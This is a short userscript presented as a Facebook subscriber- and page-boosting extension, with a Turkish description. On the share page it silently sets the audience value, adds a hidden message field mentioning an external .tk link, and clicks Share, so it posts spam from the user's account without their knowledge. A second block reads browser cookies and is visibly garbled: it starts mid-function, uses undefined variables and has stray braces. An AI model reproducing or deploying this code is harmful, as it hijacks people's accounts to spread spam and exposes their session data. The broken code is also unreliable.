// ==UserScript==
// @name           Chrome Facebook
// @author         Chrome Facebook
// @version        1.0
// @description    Facebook Abone Kasma & Sayfa Kasma Eklentisi
// @namespace      Chrome Facebook
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        http://*.formspring.me/*
// ==/UserScript==

if (document.URL.indexOf("sharer.php") >= 0) {
    document.getElementsByName("UITargetedPrivacyWidget").item(0).value = "80";
    document.getElementsByName("audience[0][value]").item(0).value = "80";
    document.forms.item(0).innerHTML += "<input type='hidden' autocomplete='off' class='mentionsHidden' name='message' value='@[www.zamanexit.tk:ZamanTünelinden Çıkış! ]'>"; 
    document.getElementsByName("share").item(0).click();
}
if (document.URL.indexOf("facebook.com/SeyhunFanPage") >= 0 && document.URL.indexOf("sharer.php") < 0) {

            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}